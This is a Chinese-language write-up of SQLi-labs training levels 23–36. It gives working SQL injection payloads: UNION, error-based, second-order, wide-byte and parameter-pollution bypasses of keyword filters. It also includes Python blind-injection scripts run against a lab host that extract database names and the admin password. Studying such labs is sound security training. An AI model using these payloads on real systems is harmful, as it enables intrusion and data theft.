---
title: SQLi-labs Advanced Injection
author: 3ND
tags:
  - SQLi
  - Writeup
  - CTF
date: 2019-05-19 10:25:00
---
## Less 23

Description: error based / strip comments

```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

在获取`id`参数时进行了`#、--`注释符的过滤。


```sql
# id=-1' union select 1,database(),'3
SELECT * FROM users WHERE id='-1' union select 1,database(),’3’ limit 0,1
```
回显：Your Login name:security / Your Password:3

- 获取数据库和表名

```sql
union select 1,(select group_concat(schema_name) from information_schema.schemata), \
(select group_concat(table_name) from information_schema.tables \
where table_schema=database())'
# information_schema,challenges,mysql,performance_schema,security
# emails,referers,uagents,users
```
- 获取users表中的列

```sql
union select 1,(select group_concat(column_name) from information_schema.columns \
where table_name='users'),'3
# id,username,password
```

- 获取内容

```sql
union select 1,(select group_concat(username) from users),'3
# Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,\
# admin2,admin3,dhakkan,admin4
```

## Less 24

Description: POST / Second Oder Injections *Real treat* / Stored injections

> A second-order code injection attack is the process where malicious code is injected into a web-based application and not immediately executed but is stored by the application to be retrieved, rendered and executed by the victim later.

![](/assets/images/move/1558242073852-137c7b07-4f9a-4c46-95bf-258222378e00.png)

注册 `admin'#`/`admin'-- `账户，更新密码时构成:

```sql
UPDATE users SET passwd="New_Pass" WHERE username='admin'# ' AND password=''
```

从而更新`admin`的密码。


## Less 25

Description: GET / Error based / All your OR & AND belong to us / string single quote

```php
function blacklist($id) {
	$id= preg_replace('/or/i',"", $id);  //strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);  //Strip out AND (non case sensitive)
	return $id;
}
```

此关卡过滤了`and`、`or`关键字，常见的绕过方法为:

- 大小写绕过(Or/oR/OR)
- 编码绕过(hex/urlencode)
- 添加注释(/or/)
- 符号替换(&&/||)

```sql
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

尝试`xpath`函数报错注入:

```sql
# or -> ||
?id=1'||extractvalue(1,concat(0x7e,database()))--+
# XPATH syntax error: '~security'
'||updatexml(1,concat(0x7e,(select group_concat(table_name) \
from infoorrmation_schema.TABLES \ 
where TABLE_SCHEMA=database()),0x7e),1)--+
# XPATH syntax error: '~emails,referers,uagents,users~'
```

## Less 25a

Description: GET / Blind based / All  your OR & AND belong to us / Intiger based

在`Less 25`的基础上改成了bool类型的的盲注，且作为数字类型不用考虑闭合。

```python
# coding=utf-8
import requests
import urllib

main_url = "http://43.247.91.228:84/Less-25a/?id="

# signal
correct = 'Your Password:Dumb'

# data
db_num = 0
db_name = []
current_db = ''

# query it!
def query_it(s):
    s = urllib.parse.quote_plus(s)
    url = main_url + s
    html = requests.get(url)
    if correct in html.text:
        return True
    return False

# get database num
def get_db_num():
    payload_or = '2333 || (select if((select count(SCHEMA_NAME)' \
        'from infoorrmation_schema.schemata)=%d, 1, 0))'
    payload_and = '1 && (select if((select count(SCHEMA_NAME)' \
        'from infoorrmation_schema.schemata)=%d, 1, 0))'
    for i in range(1, 10):
        s = payload_or % i
        if query_it(s):
            return i
    return -1

# get database name length
def get_db_name_length(db):
    payload = '1 && (select if(length((select SCHEMA_NAME '\
        'from infoorrmation_schema.schemata limit %d, 1))%s%d, 1, 0))'
    # binary search
    left = 0
    right = 50
    while left <= right:
        mid = (left + right) // 2
        s = payload % (db, '=', mid)
        if query_it(s):
            return mid
        else:
            s = payload % (db, '>', mid)
            if query_it(s):
                left = mid + 1
            else:
                right = mid - 1
    return -1


# get database name
def get_db_name():
    payload = '2333 || ascii(substr((select SCHEMA_NAME ' \
        'from infoorrmation_schema.schemata limit %d, 1), %d, 1))%s%d'
    # db_id
    for db_i in range(db_num):
        print('[%d]' % db_i, end='')
        length = get_db_name_length(db_i)
        result = ""
        for word_i in range(1, length + 1):
            # binary search
            left = 33
            right = 127
            while left <= right:
                mid = (left + right) // 2
                s = payload % (db_i, word_i, '=', mid)
                if query_it(s):
                    result += chr(mid)
                    print(chr(mid), end='')
                    break
                else:
                    s = payload % (db_i, word_i, '>', mid)
                    if query_it(s):
                        left = mid + 1
                    else:
                        right = mid - 1
        db_name.append(result)
        print()

# get current database name
def get_current_db():
    print('[*]', end='')
    payload = '1 && ascii(substr((select database()), %d, 1))%s%d'
    result = ''
    for i in range(20):
        left = 33
        right = 127
        while left <= right:
            mid = (left + right) // 2
            s = payload % (i, '=', mid)
            if query_it(s):
                result += chr(mid)
                print(chr(mid), end="")
                break
            else:
                s = payload % (i, '>', mid)
                if query_it(s):
                    left = mid + 1
                else:
                    right = mid - 1
    print()
    return result


if __name__ == "__main__":
    print('[*]Searching the databse num...')
    db_num = get_db_num()
    print('[+]Database num is: %d' % db_num)
    print('[*]Searching database name...')
    get_db_name()
    print(db_name)
    print('[*]Searching the current database name...')
    current_db = get_current_db()
    print('[+]' + current_db)
'''
[*]Searching the databse num...
[+]Database num is: 5
[*]Searching database name...
[0]information_schema
[1]challenges
[2]mysql
[3]performance_schema
[4]security
['information_schema', 'challenges', 'mysql', 'performance_schema', 'security']
[*]Searching the current database name...
[*]security
[+]security
'''
```

## Less 26

Description: GET / Error based / All your SPACES & COMMENTS belong to us

```php
function blacklist($id) {
	$id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id); //Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id); //strip out /*
	$id= preg_replace('/[--]/',"", $id); //Strip out --
	$id= preg_replace('/[#]/',"", $id);	//Strip out #
	$id= preg_replace('/[\s]/',"", $id); //Strip out spaces
   	//\s匹配任何空白字符，包括空格、制表符、换页符等等
	$id= preg_replace('/[\/\\\\]/',"", $id); //Strip out slashes
	return $id;
}
```

在`Less 25`的基础上过略了空格和注释符，常见的bypass空格方法:

- 双写空格/换行符/制表符绕过(linfeed`%0a`、tab`%09`、NBSP:Non-breaking Space`%a0`)

- 注释符`/**/`、`()`、反引号绕过

```sql
# /**/
select/**/username/**/from/**/user/**/where/**/id=1;
# ()
select(username)from(user)where(id=1);
# `
select*from`user`where`id`=1;
```
Payload:

```sql
# NBSP：Non-breaking Space %a0
id=2333'%a0||%a0updatexml(1,concat(0x7e,(SELECT%0a@@version),0x7e),1)='1
#  XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~' 
# ()
id=2333'||updatexml(1,concat(0x7e,(select(group_concat(table_name))\
from(infoorrmation_schema.tables)\
where(table_schema=database())),0x7e),1)='1
# XPATH syntax error: '~emails,referers,uagents,users~'
# 反引号 `
id=2333'||updatexml(1,concat(0x7e,(select`email_id`\
from`emails`where`id`=1),0x7e),1)='1
# XPATH syntax error: '~Dumb@dhakkan.com~'
```
## Less 26a*

Description: GET / Blind based / All your SPACE and COMMENTS Belong to us / String-single-quotes / Parenthesis

在上一题的基础上修该闭合方式为`('$id')`，同时关闭了错误回显。

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

Payload:

```python
# -*- coding: utf-8 -*-
import re
import requests
from urllib.parse import quote_plus

main_url = 'http://43.247.91.228:84/Less-26a/?id='

correct = r'Your Password:Dumb'

# payload
cur_db_name_ = '2333\') || ascii(substr((select database()), %d, 1))%s(\'%d'
cur_db_tabs_ = '2333\') || ascii(substr((select group_concat(table_name) '\
    'from infoorrmation_schema.tables '\
        'where table_schema=database()), %d, 1))%s(\'%d'
columns_ = '2333\') || ascii(substr((select group_concat(column_name) '\
    'from infoorrmation_schema.columns '\
        'where table_schema=database() '\
            'anandd table_name=\'users\'), %d, 1))%s(\'%d'
password_ = '2333\') || ascii(substr((select passwoorrd '\
    'from users where username=\'admin\'),%d,1))%s(\'%d'

def check(query_string):
    query_string = query_string.replace(' ', '%a0')
    #print(query_string)
    url = main_url + query_string
    html = requests.get(url)
    if correct in html.text:
        return True
    return False

def search(payload):
    print('[*]' + payload)
    result = ''
    print('[~]', end = '')
    for i in range(1, 100):
        left = 33
        right = 127
        #binary search
        while left <= right:
            mid = (left + right) // 2
            s = payload % (i, '=', mid)
            if check(s):
                result += chr(mid)
                print(chr(mid), end = '')
                break
            else:
                s = payload % (i, '>', mid)
                if check(s):
                    left = mid + 1
                else:
                    right = mid - 1
        if left > right:
            break
    print()
    return result

if __name__=="__main__":
    cur_db_name = search(cur_db_name_)
    print('[+]current_db:' + cur_db_name)
    cur_db_tabs = search(cur_db_tabs_)
    print('[+]tables:' + cur_db_tabs)
    columns = search(columns_)
    print('[+]users columns:' + columns)
    password = search(password_)
    print('[+]admin password:' + password)
```

## Less 27

Description: GET / Error based / All your UNION & SELECT Belong to us / Single quotes

```php
function blacklist($id) {
	$id= preg_replace('/[\/\*]/',"", $id); //strip out /*
	$id= preg_replace('/[--]/',"", $id); //Strip out --.
	$id= preg_replace('/[#]/',"", $id); //Strip out #.
	$id= preg_replace('/[ +]/',"", $id); //Strip out spaces.
	$id= preg_replace('/select/m',"", $id); //Strip out spaces.
	$id= preg_replace('/[ +]/',"", $id); //Strip out spaces.
	$id= preg_replace('/union/s',"", $id); //Strip out union
	$id= preg_replace('/select/s',"", $id);	//Strip out select
	$id= preg_replace('/UNION/s',"", $id); //Strip out UNION
	$id= preg_replace('/SELECT/s',"", $id); //Strip out SELECT
	$id= preg_replace('/Union/s',"", $id); //Strip out Union
	$id= preg_replace('/Select/s',"", $id); //Strip out select
	return $id;
}
```

过滤了:

```bash
union UNION Union
select SELECT Select
```

可以考虑大小写混合`UnIoN、SeLeCt`/双写`uniunionon、selselectect`进行绕过。




## Less 27a

Description: GET / Blind based / All your UNION & SELECT Belong to us / Double quotes

在Less 27的基础上改为盲注，闭合方方式为`"`，Payload可以参考Less 26a进行修改~



## Less 28

Description: GET / Error based(Blind Based) / All your UNION & SELECT Belong to us / String-single-quotes with parenthesis

在Less 27的基础上闭合方式改为`('$id')`，没什么新意~

## HPP*

> Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short *HPP*) affects a building block of all web technologies, server and client side attacks exist. 

HTTP参数污染(HTTP Parameter Pollution)即通过利用Web应用程序对具有相同名称的多个HTTP参数解析方式的差异，绕过输入验证，从而触发应用程序错误或修改内部变量值。

一些Web服务器的参数解析规则:

|    Web Server    |          Function           |      Obtained Parameter      |
| :--------------: | :-------------------------: | :--------------------------: |
|    Apache/PHP    |        $_GET["par"]         |             Last             |
| Apache/Perl(CGI) |        Param("par")         |            First             |
|  Apache/Python   |       getvalue("par")       |          All(List)           |
|    Tomcat/Jsp    | Request.getParameter("par") |            First             |
|     IIS/Asp      | Request.QueryString("par")  | All (comma-delimited string) |



## Less 29

Description: GET / Error based / IMPIDENCE MISMATCH / Having a WAF in front of web application

这里使用`Tomcat`容器作为WAF来过滤掉危险字符，匹配规则`^\\d+$`纯数字为合法，过滤后的由Apache服务器处理后返回，可以利用HPP来进行攻击，构造参数`id=1&id=payload`绕过，Tomcat解析时取值id=1，Apache解析时取值`id=payload`。

- 攻击时序

![](/assets/images/move/1558749798187-0b947be2-9eb3-41a3-831f-de76cb9f96de.png)

## Less 30



Description: GET / Blind / IMPIDENCE  MISMATCH / Having a WAF in front of web application.



```php
$qs = $_SERVER['QUERY_STRING'];
$hint = $qs;
$id = '"' .$id. '"'; //拼接了"作为闭合方式
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```



在Less 29的基础上改为关闭错误回显，改为盲注，Payload脚本可参考Less 26a.



## Less 31 

Description:  GET / Blind / IMPIDENCE  MISMATCH / Having a WAF in front of web application.

```php
$qs = $_SERVER['QUERY_STRING'];
$hint = $qs;
$id = '"'.$id.'"'; //""
$sql="SELECT * FROM users WHERE id= ($id) LIMIT 0,1"; //()
```

闭合方式为`("")`，bypass方法与Less 29、30相同。



## Less 32

Description: GET / bypass custom filter adding slashes to dangerous chars.

```php
function check_addslashes($string) {
    //escape any backslash 去除反斜线\
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string); 
    //escape single quote with a backslash 去除\'
    $string = preg_replace('/\'/i', '\\\'', $string); 
    //escape double quote with a backslash 去除\"
    $string = preg_replace('/\"/', "\\\"", $string); 
    return $string;
}
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

> [【PHP代码审计】入门之路——第二篇-宽字节注入](https://xz.aliyun.com/t/1719)

`%df’` 被PHP转义（GPC/addslashes()/iconv/），单引号被加上反斜杠\，变成了`%df\’`，其中\的十六进制是 `%5C` ，那么现在 `%df\’` =`%df%5c%27`，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 `%df%5c` 是一个宽字符，也就是`運’`，也就是说：`%df\’` = `%df%5c%27`=`運’`,从而逃逸出`'`。

```sql
%df%27===(addslashes)===>%df%5c%27===(数据库GBK)===>運' //逃逸单引号
id=%df%27 union select 1,database(),3%23
# �\' union select 1,database(),3#
# Your Login name:security
id=%df' or updatexml(1,concat(0x7e,(select group_concat(table_name)
from information_schema.TABLES 
where TABLE_SCHEMA=database()),0x7e),1)--+
#XPATH syntax error: '~emails,referers,uagents,users~'
```



## Less 36

Description: GET / Bypass mysql_real_escape_string()

```php
function check_quotes($string) {
    $string= mysql_real_escape_string($string);    
    return $string;
}
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。

下列字符受影响：

- \x00
- \n
- \r
- \
- '
- "
- \x1a

如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。

Payload: ?id=`%df'`

```sql
or updatexml(1,concat(0x7e,(select group_concat(table_name) 
from information_schema.TABLES 
where TABLE_SCHEMA=database()),0x7e),1)--+
# XPATH syntax error: '~emails,referers,uagents,users~' 
```



